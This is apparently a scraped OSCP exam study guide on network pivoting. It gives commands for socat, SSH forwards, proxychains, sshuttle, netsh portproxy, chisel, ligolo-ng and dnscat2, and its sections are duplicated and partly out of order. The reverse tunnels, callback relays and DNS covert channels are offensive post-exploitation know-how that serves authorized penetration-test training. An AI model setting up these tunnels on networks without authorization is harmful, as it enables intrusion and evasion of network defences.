r:127.0.0.1:local_port:internal_host:internal_port ``` ### 9.3 forward socks when the client is on the tool side ```bash # pivot/server side chisel server --socks5 --port chisel_port # kali/client side chisel client --fingerprint 'server_fingerprint' pivot:chisel_port \ 127.0.0.1:1080:socks ``` ### 9.4 current udp-aware mode current upstream chisel distinguishes: ```text socks / r:socks -> socks5 tcp connect only udpsocks / r:udpsocks -> tcp connect plus socks5 udp associate ``` ```bash # requires compatible current peers chisel client --fingerprint 'server_fingerprint' \ lhost:chisel_port r:127.0.0.1:1080:udpsocks ``` > this does not make proxychains udp-capable—proxychains remains tcp-only. the udp application must support socks5 udp associate, or another compatible adapter must be used. current chisel peers, tcp and udp firewall access to the socks listener, and its documented association/fragmentation limits all matter. ### 9.5 chisel failure cues ```bash chisel --version chisel server --help chisel client --help ss -lntp ``` | cue | interpretation | | --- | --- | | no connection at server | pivot egress, address, listener or websocket/proxy path | | http reaches server but upgrade fails | intermediary may block websocket upgrade | | `exec format error` | wrong os/architecture | | missing glibc/version symbol | build/runtime incompatibility; choose a compatible official build | | fingerprint mismatch | wrong server or changed key; do not bypass verification blindly | | socks listener exists but endpoint fails | pivot-to-destination or application/proxy compatibility | | tcp works but udp fails | ordinary `socks`, old peer, udp bind/firewall or unsupported client | ## 10. ligolo-ng routed pivot ### 10.1 proxy and agent on kali: ```bash ./proxy -selfcert -laddr 0.0.0.0:ligolo_port ``` in the proxy console, obtain the fingerprint: ```text certificate_fingerprint ``` on the pivot: ```bash ./agent -connect lhost:ligolo_port -accept-fingerprint cert_fingerprint ``` `-ignore-cert` is a controlled-lab/debug fallback, not the baseline. ### 10.2 current managed interface and route in the ligolo console: ```text interface_create --name ligolo session ifconfig interface_add_route --name ligolo --route internal_subnet tunnel_start --tun ligolo ``` manual linux alternative: ```bash sudo ip tuntap add user "$user" mode tun ligolo sudo ip link set ligolo up sudo ip route add internal_subnet dev ligolo ``` then use normal clients: ```bash ip route get internal_host nmap -st -pn -n -p ports internal_host curl -v http://internal_host:port/ ``` > ligolo translates connections through a userland network stack. ordinary tcp clients generally work without proxychains, but raw-packet assumptions, icmp details and some udp behavior can differ from direct access. use connect-based validation first. ### 10.3 pivot loopback services ligolo maps its special `240.0.0.0/4` range to the selected agent's loopback. add one narrow route: ```bash sudo ip route add 240.0.0.1/32 dev ligolo nmap -st -pn -n -p ports 240.0.0.1 ``` use this only when the desired service is bound to `127.0.0.1` on the agent. ### 10.4 callback or file-server listener on the agent in the selected ligolo session: ```text listener_add --addr 0.0.0.0:pivot_port --to 127.0.0.1:kali_port --tcp listener_list ``` kali listener: ```bash ncat -lvn 127.0.0.1 kali_port ``` an internal target connects to `pivot_reachable_ip:pivot_port`; ligolo relays it to kali's loopback listener. cleanup: ```text listener_stop listener_id ``` ## 11. dns and kerberos across pivots - decide whether the application resolves the name locally, proxychains intercepts it, the socks exit resolves it, or the pivot's configured resolver handles it. - use numeric addresses for route validation; then restore the confirmed hostname when the application protocol requires it. - kerberos needs an spn-compatible hostname, realm/kdc route and correct time. a working ip connection does not prove kerberos naming works. - a temporary host mapping is acceptable only for a confirmed in-scope address/name pair and must be recorded. ```bash getent hosts internal_fqdn curl --socks5-hostname 127.0.0.1:1080 http://internal_fqdn:port/ klist krb5_trace=/dev/stderr kvno cifs/target_host ``` the first command checks kali's normal resolver. the `curl` form deliberately delegates the destination hostname through socks. do not assume a generic resolver utility will be intercepted by proxychains: nss implementation and process behavior vary. for impacket, preserve the target hostname while routing to an ip when the tool supports it: ```bash impacket-wmiexec -k -no-pass -dc-ip dc_ip -target-ip target_ip \ 'domain/user@target_host' ``` ## 12. callback and delivery routing a forward path and callback path are different graphs: ```text kali -> tunnel -> internal service # access path internal target -> pivot -> kali listener # callback path ``` options: 1. make the callback directly to an address the internal host already reaches; 2. expose a listener on the pivot and relay it to kali; 3. use a ligolo agent listener or ssh/chisel remote forward; 4. choose a non-callback technique such as authenticated remote execution. fixed ssh callback relay, run from the pivot: ```bash ssh -n -g -l 0.0.0.0:pivot_port:127.0.0.1:kali_port \ kali_user@lhost -o exitonforwardfailure=yes ``` this creates the listener on the ssh client/pivot and makes the destination connection from kali's ssh server to kali loopback. `-g` permits other hosts to use the pivot-side local forward. verify the actual bind with `ss`; do not infer it from command syntax. also route payload delivery separately. an internal host may reach the pivot but not kali's http server; relay the delivery service or serve from the pivot when justified. ## 13. multi-hop routes for every additional hop, write another complete segment: ```text kali -> tunnel a -> pivot_a -> tunnel b -> pivot_b -> internal_host:port ``` rules: - validate one hop before adding the next; - avoid overlapping local/vpn/internal routes; - use unique listener and socks ports; - record which session owns each route; - ensure the deeper agent/client can reach the upstream listener; - re-evaluate dns and callback direction at every hop; - prefer a routed method for several deep services instead of stacking many opaque wrappers. an upstream tunnel failure invalidates every deeper observation. do not troubleshoot target credentials until the complete path is restored. ## 14. dns tunneling with dnscat2 use only when ordinary transports are unavailable and dns is demonstrably permitted. this is a conditional advanced route, but it remains in the current official bok. prerequisites: - command execution sufficient to run a compatible client; - either authoritative control/ns delegation for `tunnel_domain` or direct udp/53 reachability to the server; - a resolver chain that forwards the chosen domain externally; - permission to bind/listen on the required dns port; - tolerance for low throughput and conspicuous dns patterns. authoritative-domain mode: ```bash dnscat2-server --secret=shared_secret tunnel_domain ``` client: ```bash ./dnscat --secret=shared_secret tunnel_domain ``` direct dns-server mode shown by the server's own usage output: ```bash ./dnscat --dns server=dns_server,port=53 --secret=shared_secret ``` server console: ```text windows window -i session_id help ``` > a dns query reaching the server proves only the resolver path. match the pre-shared secret or independently verify the negotiated authentication string. cache, recursion, edns, tcp fallback, dns security controls and response-size limits can affect the channel. dns tunneling is not dns spoofing; spoofing remains prohibited by the current exam guide. ## 15. failure router | evidence | failing layer | next decision prerequisites | | proxychains shows no hook/connection | static/incompatible client or config | use native proxy option, explicit forward or routed pivot | | nmap through socks finds nothing | wrong scan type/discovery/dns/latency | use focused `-st -pn -n`; verify with ncat/curl | | kerberos works by ip only for tcp, auth fails | dns/spn/kdc/time | separate route address from service hostname | | forward access works; callback absent | reverse path/listener bind | draw target-to-listener route independently | | chisel starts but server sees nothing | egress/url/websocket/binary execution | capture stderr and inspect transport | | ligolo session exists; route misses tunnel | os route/interface/session | check route selection and selected agent/tunnel | | tcp works, udp fails | tool/client transport limitation | identify a genuine udp-capable path; do not assume socks/proxychains | | dns queries never reach authority | delegation/resolver/egress | prove the dns path before debugging dnscat2 crypto | | deep route suddenly fails everywhere | upstream tunnel/session | repair from the first hop outward | ## 16. verification and cleanup kali/linux: ```bash ss -lntup ip -brief address ip route ps -ef | grep -e '[s]sh .*-[ldr]|[c]hisel|[l]igolo|[s]ocat|[s]shuttle' ``` windows: ```cmd netstat -ano tasklist netsh interface portproxy show all netsh advfirewall firewall show rule name="oscp pivot local_port" ``` record: - exact process/command and version; - bind address and port; - transport direction and initiator; - pivot and destination; - routes/name mappings/configuration files added; - simple tcp proof and final application proof; - callback proof where applicable; - cleanup command and result. stop tunnel processes and remove tun routes, ligolo listeners, temporary mappings, password files, netsh rules and firewall exceptions after the authorized task. ## tooling for this section | tool | purpose | required context | baseline | decisive output | failure cue | | --- | --- | --- | --- | --- | --- | | `ip`/`route`/`ss`/`netstat` | discover and verify each hop | shell on relevant host | sections 2 and 16 | correct route and listener | baseline proof | | socat | simple fixed tcp relay | binary and bind permission | section 4 | listener plus remote connection | clear relay exposed too broadly | | openssh | fixed, dynamic, remote and ## 1. draw the route before choosing a command

```text
application tool
  -> local listener / socks endpoint / tun route
  -> tunnel transport endpoint
  -> pivot exit
  -> internal destination service

callback target
  -> pivot listener or routable address
  -> relay/tunnel
  -> final listener
```

record:

```text
tool_host -> entry_socket/route -> transport -> pivot -> destination
application protocol | tcp/udp | initiator | bind address | dns point
credential/spn name | callback route | privilege | cleanup objects
```

do not use “pivot works” as a single state. confirm these layers separately:

1. the tunnel process started;
2. its listener/transport connection exists;
3. the pivot can reach the intended destination socket;
4. the local route, forward or proxy points at the right exit;
5. the application actually uses that path;
6. name resolution and authentication match the application;
7. a callback, if required, has its own return path.

## 2. discover the pivot's network position

linux:

```bash
id
ip -brief address
ip route
ip neigh
ss -lntup
cat /etc/resolv.conf
```

windows:

```cmd
whoami /all
ipconfig /all
route print
arp -a
netstat -ano
```

powershell selected endpoints:

```powershell
get-netipconfiguration
get-netroute -addressfamily ipv4 | sort-object destinationprefix,routemetric
get-nettcpconnection -state listen
get-dnsclientserveraddress -addressfamily ipv4
```

> an interface or route proves a possible network position, not destination reachability. validate one justified socket from the pivot before building a tunnel.

```bash
nc -nvz -w 3 internal_host internal_port
curl -v --connect-timeout 5 http://internal_host:internal_port/
```

```powershell
test-netconnection internal_host -port internal_port
```

## 3. choose the smallest compatible route

| need | baseline | choose when | main limitation |
| --- | --- | --- | --- |
| one tcp service through an ssh pivot | ssh local forward | kali can initiate ssh to pivot | one destination socket per forward |
| many tcp destinations through ssh pivot | ssh dynamic forward | kali can initiate ssh to pivot | socks/client compatibility |
| pivot can connect outward but inbound access is blocked | ssh remote or remote-dynamic forward | pivot has openssh client and can reach kali ssh | kali ssh policy; openssh version for remote dynamic |
| ssh hop directly to internal ssh | `proxyjump` | both pivot and destination provide ssh | ssh-only path |
| simple linux tcp relay | socat | binary already exists and listener can be exposed | clear tcp relay; no authentication/encryption |
| transparent selected subnets through ssh | sshuttle | suitable ssh server with python; local privileges | tcp/dns-oriented, local firewall changes |
| windows ssh-based forward | built-in `ssh.exe` or plink | compatible client exists and outbound ssh works | server policy and credential/host-key handling |
| windows native fixed tcp relay | `netsh interface portproxy` | elevated token; target modification acceptable | tcp only; firewall/ip helper/stateful cleanup |
| outbound http/websocket-shaped tunnel | chisel | pivot can run matching binary and reach server | client/server compatibility and proxy/client transport limits |
| routed access for ordinary clients | ligolo-ng | agent can reach proxy and tun/route setup is possible | userland stack is not identical to direct raw networking |
| dns is the only viable egress | dnscat2 | dns path plus authoritative/direct server control | slow/noisy, infrastructure and client required |

prefer one explicit forward for one known service. use socks when several tcp endpoints must be explored. use a routed pivot when many ordinary tools must operate without proxy wrappers. do not add a multi-host route when command execution directly on the pivot is sufficient.

sections.title: 4. Socat fixed TCP relay
sections.search:
## 4. socat fixed tcp relay

on a linux pivot, expose one internal tcp service:

```bash
socat -ddd tcp-listen:local_port,bind=pivot_reachable_ip,reuseaddr,fork \
  tcp:internal_host:internal_port
```

loopback-only relay for another local tunnel stage:

```bash
socat -ddd tcp-listen:local_port,bind=127.0.0.1,reuseaddr,fork \
  tcp:internal_host:internal_port
```

verify the listener on the pivot with `ss -lntp | grep local_port`. run `nc -nvz pivot_reachable_ip local_port` from the intended client to test client-to-pivot reachability. these checks run on different machines:

```bash
ss -lntp | grep local_port
nc -nvz pivot_reachable_ip local_port
```

> `fork` handles multiple connections. `reuseaddr` eases rebinding after restart. socat does not add authentication or encryption to this relay; bind narrowly and remove the process when finished. a listener can exist even when the pivot-to-destination connection fails.

## 5. openssh forwarding add reliability and attributable failure to transport-only sessions: ```text -n -o exitonforwardfailure=yes -o serveraliveinterval=30 -o serveralivecountmax=3 ``` `exitonforwardfailure` proves requested listening sockets were established. it does not prove the final destination is reachable through them. ### 5.1 local forward: listener on the ssh client run on kali when kali can ssh to the pivot: ```bash ssh -n \ -l 127.0.0.1:local_port:internal_host:internal_port \ -p ssh_port user@pivot \ -o exitonforwardfailure=yes \ -o serveraliveinterval=30 -o serveralivecountmax=3 ``` use the listener as though it were the internal service: ```bash nc -nvz 127.0.0.1 local_port curl -v http://127.0.0.1:local_port/ ``` > the ssh server/pivot resolves and connects to `internal_host`. bind to `127.0.0.1` unless another authorized local host must use the forward; `-g` or a non-loopback bind expands exposure. ### 5.2 dynamic forward: socks listener on the ssh client ```bash ssh -n -d 127.0.0.1:1080 -p ssh_port user@pivot \ -o exitonforwardfailure=yes \ -o serveraliveinterval=30 -o serveralivecountmax=3 ``` openssh acts as a socks4/5 server. the pivot makes destination connections selected by each socks request. ### 5.3 remote forward: listener on the ssh server run on a pivot that can initiate an ssh connection back to kali: ```bash ssh -n \ -r 127.0.0.1:kali_port:internal_host:internal_port \ -p kali_ssh_port kali_user@lhost \ -o exitonforwardfailure=yes \ -o serveraliveinterval=30 -o serveralivecountmax=3 ``` kali then uses: ```bash nc -nvz 127.0.0.1 kali_port ``` > the ssh client/pivot connects to `internal_host`. `allowtcpforwarding` and server policy must permit the forward. a non-loopback remote bind additionally depends on `gatewayports`; do not assume `0.0.0.0` was honored. ### 5.4 remote dynamic forward: socks listener on the ssh server run on the pivot: ```bash ssh -n -r 127.0.0.1:1080 -p kali_ssh_port kali_user@lhost \ -o exitonforwardfailure=yes \ -o serveraliveinterval=30 -o serveralivecountmax=3 ``` the socks listener appears on kali and destination connections exit through the pivot. remote dynamic forwarding requires openssh 7.6 or later on the client that issues `-r`. run `ssh -v` on the pivot (the ssh client). run `ss -lntp | grep 1080` on kali (the ssh server hosting the socks listener). these checks run on different machines; do not paste both into one terminal: ```bash ssh -v ss -lntp | grep 1080 ``` ### 5.5 ssh jump and proxy command direct ssh through an ssh pivot: ```bash ssh -j pivot_user@pivot target_user@internal_host ``` ssh through an existing socks5 endpoint with ncat: ```bash ssh -o proxycommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' \ target_user@internal_host ``` `%h` and `%p` are replaced with the destination host and port. prefer this native proxy route when proxychains interposition is unreliable.

sections.title: 6. ProxyChains and SOCKS-aware clients
sections.search:
## 6. proxychains and socks-aware clients

use a task-specific configuration rather than repeatedly editing a shared global file:

```text
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[proxylist]
socks5 127.0.0.1 1080
```

```bash
proxychains4 -q -f ./proxychains-pivot.conf curl http://internal_host:port/
proxychains4 -q -f ./proxychains-pivot.conf nmap -st -pn -n -p ports internal_host
proxychains4 -q -f ./proxychains-pivot.conf impacket-smbclient \
  'domain/user:password@internal_host'
```

constraints:

- proxychains hooks socket calls in dynamically linked programs; some static binaries, scripts, child processes or dynamically loaded modules bypass or break the hook.
- proxychains supports tcp only. it does not proxy udp, icmp, syn scans or pcap-based discovery.
- for nmap use `-st -pn -n` with a focused port list. proxy scanning is slow and is not a replacement for discovery from the pivot.
- `proxy_dns` moves supported hostname resolution through the proxy, but application behavior varies. `-n` prevents nmap's local reverse lookups.
- prefer an application's native proxy option when available.

native examples:

```bash
curl --socks5-hostname 127.0.0.1:1080 http://internal_host:port/
ncat --proxy-type socks5 --proxy 127.0.0.1:1080 internal_host internal_port
```

sections.search:
## 7. sshuttle transparent selected-subnet route

```bash
sudo sshuttle --dns \
  -r ssh_user@pivot:ssh_port \
  internal_subnet another_subnet
```

through a previously established local forward to the ssh pivot:

```bash
sudo sshuttle --dns \
  -r ssh_user@127.0.0.1:local_ssh_port \
  internal_subnet
```

> sshuttle is useful when many tcp clients need transparent access. it requires privileges and firewall/redirection support on the client; the remote side needs a compatible python execution path. it is not a general layer-2 vpn and does not make arbitrary raw-packet or udp behavior equivalent to direct routing. record the selected subnets so existing vpn routes are not accidentally captured.

sections.title: 8. Windows forwarding alternatives
sections.search:
## 8. windows forwarding alternatives

### 8.1 built-in openssh client

```cmd
where ssh.exe
ssh.exe -v
ssh.exe -n -r 127.0.0.1:1080 kali_user@lhost -p kali_ssh_port -o exitonforwardfailure=yes -o serveraliveinterval=30
```

the same `-l`, `-d`, `-r`, `proxyjump` and `proxycommand` concepts apply to current windows openssh. remote dynamic forwarding depends on the client version.

### 8.2 plink

remote fixed forward from windows to kali:

```cmd
plink.exe -ssh -n -batch -hostkey "host_key_fingerprint" ^
  -l kali_user -pwfile c:\path\kali-password.txt ^
  -r 127.0.0.1:kali_port:internal_host:internal_port ^
  -p kali_ssh_port lhost
```

local dynamic socks on windows:

```cmd
plink.exe -ssh -n -batch -hostkey "host_key_fingerprint" ^
  -l ssh_user -pwfile c:\path\ssh-password.txt ^
  -d 127.0.0.1:1080 -p ssh_port pivot
```

> current plink supports `-l`, `-r` and `-d`, but not openssh's remote-dynamic shorthand. `-batch` prevents an unseen prompt from hanging; pair it with a verified `-hostkey`. `-pwfile` avoids a literal password in the command line but creates a sensitive file that must be protected and removed. prefer a key or existing authenticated context where feasible.

### 8.3 netsh portproxy

elevated windows shell:

```cmd
netsh interface portproxy add v4tov4 ^
  listenaddress=pivot_reachable_ip listenport=local_port ^
  connectaddress=internal_host connectport=internal_port

netsh interface portproxy show all
netstat -ano -p tcp | findstr ":local_port"
```

if the existing firewall policy does not already allow the listener and a change is authorized:

```cmd
netsh advfirewall firewall add rule name="oscp pivot local_port" ^
  dir=in action=allow protocol=tcp localport=local_port
```

cleanup:

```cmd
netsh interface portproxy delete v4tov4 ^
  listenaddress=pivot_reachable_ip listenport=local_port

netsh advfirewall firewall delete rule name="oscp pivot local_port"
```

> `portproxy` requires an elevated token, forwards tcp rather than udp, modifies persistent host configuration and may depend on the ip helper service. a stored rule or listening socket still does not prove the destination is reachable. record and remove both the proxy and any firewall rule.

sections.title: 9. Chisel HTTP/WebSocket tunnel
sections.search:
## 9. chisel http/websocket tunnel

### 9.1 reverse socks: pivot initiates outward

on kali:

```bash
chisel server --reverse --port chisel_port
```

record the server fingerprint. on the pivot:

```bash
chisel client --fingerprint 'server_fingerprint' \
  lhost:chisel_port r:127.0.0.1:1080:socks
```

`r:socks` is the shorter equivalent using the default server-side `127.0.0.1:1080` listener. traffic sent to kali's socks listener exits through the chisel client/pivot.

### 9.2 reverse fixed tcp forward

```bash
# kali
chisel server --reverse --port chisel_port

# pivot: expose an internal service on kali loopback
chisel client --fingerprint 'server_fingerprint' lhost:chisel_port \
  r:127.0.0.1:local_port:internal_host:internal_port
```

### 9.3 forward socks when the client is on the tool side

```bash
# pivot/server side
chisel server --socks5 --port chisel_port

# kali/client side
chisel client --fingerprint 'server_fingerprint' pivot:chisel_port \
  127.0.0.1:1080:socks
```

### 9.4 current udp-aware mode

current upstream chisel distinguishes:

```text
socks / r:socks       -> socks5 tcp connect only
udpsocks / r:udpsocks -> tcp connect plus socks5 udp associate
```

```bash
# requires compatible current peers
chisel client --fingerprint 'server_fingerprint' \
  lhost:chisel_port r:127.0.0.1:1080:udpsocks
```

> this does not make proxychains udp-capable—proxychains remains tcp-only. the udp application must support socks5 udp associate, or another compatible adapter must be used. current chisel peers, tcp and udp firewall access to the socks listener, and its documented association/fragmentation limits all matter.

### 9.5 chisel failure cues

```bash
chisel --version
chisel server --help
chisel client --help
ss -lntp
```

| cue | interpretation |
| --- | --- |
| no connection at server | pivot egress, address, listener or websocket/proxy path |
| http reaches server but upgrade fails | intermediary may block websocket upgrade |
| `exec format error` | wrong os/architecture |
| missing glibc/version symbol | build/runtime incompatibility; choose a compatible official build |
| fingerprint mismatch | wrong server or changed key; do not bypass verification blindly |
| socks listener exists but endpoint fails | pivot-to-destination or application/proxy compatibility |
| tcp works but udp fails | ordinary `socks`, old peer, udp bind/firewall or unsupported client |

## 10. ligolo-ng routed pivot

### 10.1 proxy and agent

on kali:

```bash
./proxy -selfcert -laddr 0.0.0.0:ligolo_port
```

in the proxy console, obtain the fingerprint:

```text
certificate_fingerprint
```

on the pivot:

```bash
./agent -connect lhost:ligolo_port -accept-fingerprint cert_fingerprint
```

`-ignore-cert` is a controlled-lab/debug fallback, not the baseline.

### 10.2 current managed interface and route

in the ligolo console:

```text
interface_create --name ligolo
session
ifconfig
interface_add_route --name ligolo --route internal_subnet
tunnel_start --tun ligolo
```

manual linux alternative:

```bash
sudo ip tuntap add user "$user" mode tun ligolo
sudo ip link set ligolo up
sudo ip route add internal_subnet dev ligolo
```

then use normal clients:

```bash
ip route get internal_host
nmap -st -pn -n -p ports internal_host
curl -v http://internal_host:port/
```

> ligolo translates connections through a userland network stack. ordinary tcp clients generally work without proxychains, but raw-packet assumptions, icmp details and some udp behavior can differ from direct access. use connect-based validation first.

### 10.3 pivot loopback services

ligolo maps its special `240.0.0.0/4` range to the selected agent's loopback. add one narrow route:

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
nmap -st -pn -n -p ports 240.0.0.1
```

use this only when the desired service is bound to `127.0.0.1` on the agent.

### 10.4 callback or file-server listener on the agent

in the selected ligolo session:

```text
listener_add --addr 0.0.0.0:pivot_port --to 127.0.0.1:kali_port --tcp
listener_list
```

kali listener:

```bash
ncat -lvn 127.0.0.1 kali_port
```

an internal target connects to `pivot_reachable_ip:pivot_port`; ligolo relays it to kali's loopback listener. cleanup:

```text
listener_stop listener_id
```

sections.title: 11. DNS and Kerberos across pivots
sections.search:
## 11. dns and kerberos across pivots

- decide whether the application resolves the name locally, proxychains intercepts it, the socks exit resolves it, or the pivot's configured resolver handles it.
- use numeric addresses for route validation; then restore the confirmed hostname when the application protocol requires it.
- kerberos needs an spn-compatible hostname, realm/kdc route and correct time. a working ip connection does not prove kerberos naming works.
- a temporary host mapping is acceptable only for a confirmed in-scope address/name pair and must be recorded.

```bash
getent hosts internal_fqdn
curl --socks5-hostname 127.0.0.1:1080 http://internal_fqdn:port/
klist
krb5_trace=/dev/stderr kvno cifs/target_host
```

the first command checks kali's normal resolver. the `curl` form deliberately delegates the destination hostname through socks. do not assume a generic resolver utility will be intercepted by proxychains: nss implementation and process behavior vary.

for impacket, preserve the target hostname while routing to an ip when the tool supports it:

```bash
impacket-wmiexec -k -no-pass -dc-ip dc_ip -target-ip target_ip \
  'domain/user@target_host'
```

sections.title: 12. Callback and delivery routing
sections.search:
## 12. callback and delivery routing

a forward path and callback path are different graphs:

```text
kali -> tunnel -> internal service       # access path
internal target -> pivot -> kali listener # callback path
```

options:

1. make the callback directly to an address the internal host already reaches;
2. expose a listener on the pivot and relay it to kali;
3. use a ligolo agent listener or ssh/chisel remote forward;
4. choose a non-callback technique such as authenticated remote execution.

fixed ssh callback relay, run from the pivot:

```bash
ssh -n -g -l 0.0.0.0:pivot_port:127.0.0.1:kali_port \
  kali_user@lhost -o exitonforwardfailure=yes
```

this creates the listener on the ssh client/pivot and makes the destination connection from kali's ssh server to kali loopback. `-g` permits other hosts to use the pivot-side local forward. verify the actual bind with `ss`; do not infer it from command syntax.

also route payload delivery separately. an internal host may reach the pivot but not kali's http server; relay the delivery service or serve from the pivot when justified.

sections.title: 13. Multi-hop routes
14. DNS tunneling with dnscat2
sections.search:
## 14. dns tunneling with dnscat2

use only when ordinary transports are unavailable and dns is demonstrably permitted. this is a conditional advanced route, but it remains in the current official bok.

prerequisites:

- command execution sufficient to run a compatible client;
- either authoritative control/ns delegation for `tunnel_domain` or direct udp/53 reachability to the server;
- a resolver chain that forwards the chosen domain externally;
- permission to bind/listen on the required dns port;
- tolerance for low throughput and conspicuous dns patterns.

authoritative-domain mode:

```bash
dnscat2-server --secret=shared_secret tunnel_domain
```

client:

```bash
./dnscat --secret=shared_secret tunnel_domain
```

direct dns-server mode shown by the server's own usage output:

```bash
./dnscat --dns server=dns_server,port=53 --secret=shared_secret
```

server console:

```text
windows
window -i session_id
help
```

> a dns query reaching the server proves only the resolver path. match the pre-shared secret or independently verify the negotiated authentication string. cache, recursion, edns, tcp fallback, dns security controls and response-size limits can affect the channel. dns tunneling is not dns spoofing; spoofing remains prohibited by the current exam guide.

sections.title: 15. Failure router
sections.search:
## 15. failure router

| evidence | failing layer | next decision |
| --- | --- | --- |
| pivot cannot reach destination | internal route/firewall/service | fix or choose another pivot before tunneling |
| tunnel client cannot reach server | transport/egress/listener | test the exact server address/port from pivot |
| ssh says forwarding disabled | server policy | use an authorized alternative; do not keep changing client flags |
| local/remote port does not bind | address in use, privilege or bind policy | inspect listeners and `exitonforwardfailure` output |
| listener exists; simple tcp test fails | pivot-to-destination or wrong destination | test from pivot and inspect tunnel logs |
| simple tcp works; application fails | client/protocol/authentication | check native proxy support, hostname/spn and application prerequisites |
| proxychains shows no hook/connection | static/incompatible client or config | use native proxy option, explicit forward or routed pivot |
| nmap through socks finds nothing | wrong scan type/discovery/dns/latency | use focused `-st -pn -n`; verify with ncat/curl |
| kerberos works by ip only for tcp, auth fails | dns/spn/kdc/time | separate route address from service hostname |
| forward access works; callback absent | reverse path/listener bind | draw target-to-listener route independently |
| chisel starts but server sees nothing | egress/url/websocket/binary execution | capture stderr and inspect transport |
| ligolo session exists; route misses tunnel | os route/interface/session | check route selection and selected agent/tunnel |
| tcp works, udp fails | tool/client transport limitation | identify a genuine udp-capable path; do not assume socks/proxychains |
| dns queries never reach authority | delegation/resolver/egress | prove the dns path before debugging dnscat2 crypto |
| deep route suddenly fails everywhere | upstream tunnel/session | repair from the first hop outward |

sections.title: 16. Verification and cleanup
sections.search:
## 16. verification and cleanup

kali/linux:

```bash
ss -lntup
ip -brief address
ip route
ps -ef | grep -e '[s]sh .*-[ldr]|[c]hisel|[l]igolo|[s]ocat|[s]shuttle'
```

windows:

```cmd
netstat -ano
tasklist
netsh interface portproxy show all
netsh advfirewall firewall show rule name="oscp pivot local_port"
```

record:

- exact process/command and version;
- bind address and port;
- transport direction and initiator;
- pivot and destination;
- routes/name mappings/configuration files added;
- simple tcp proof and final application proof;
- callback proof where applicable;
- cleanup command and result.

stop tunnel processes and remove tun routes, ligolo listeners, temporary mappings, password files, netsh rules and firewall exceptions after the authorized task.

## tooling for this section

| tool | purpose | required context | baseline | decisive output | failure cue |
| --- | --- | --- | --- | --- | --- |
| `ip`/`route`/`ss`/`netstat` | discover and verify each hop | shell on relevant host | sections 2 and 16 | correct route and listener | listener exists on wrong interface |
| ncat/curl/test-netconnection | prove one socket | route from test source | sections 2 and 16 | tcp handshake/application response | complex tool fails before baseline proof |
| socat | simple fixed tcp relay | binary and bind permission | section 4 | listener plus remote connection | clear relay exposed too broadly |
| openssh | fixed, dynamic, remote and jump routes | ssh authentication/policy | section 5 | requested listener and successful client flow | forwarding or bind denied |
| proxychains | wrap compatible tcp clients | socks endpoint + dynamic linking | section 6 | connection log through proxy | udp/raw/static client unsupported |
| sshuttle | transparent selected-subnet tcp/dns route | ssh, client privileges, remote python | section 7 | ordinary client reaches selected subnet | route collision/firewall backend issue |
| windows `ssh.exe`/plink | ssh forwards from windows | client present and server reachable | section 8 | kali/windows listener established | hidden host-key/password prompt |
| netsh portproxy | native windows fixed tcp relay | elevated token | section 8 | stored rule + listener + remote flow | firewall/ip helper/destination failure |
| chisel | http/websocket reverse socks/forwards | compatible binary and egress | section 9 | session + socks/forward listener | websocket, fingerprint or runtime error |
| ligolo-ng | routed access and agent listeners | agent/proxy + tun route | section 10 | os route and ordinary client flow | wrong session/interface/route |
| dnscat2 | conditional dns channel | resolver/authority or direct dns path | section 14 | authenticated encrypted session | dns never reaches server |

package names and command behavior vary. check local `--help`/versions before use. do not install tooling or alter host/network configuration without scope and authorization.

sections.title: Exam restriction

## exam restriction

the current oscp+ exam guide explicitly states that metasploit cannot be used for pivoting because that would involve more than one target. the current guide does not individually approve every other tool; the learner remains responsible for restrictions and must recheck the guide before a mock or exam.
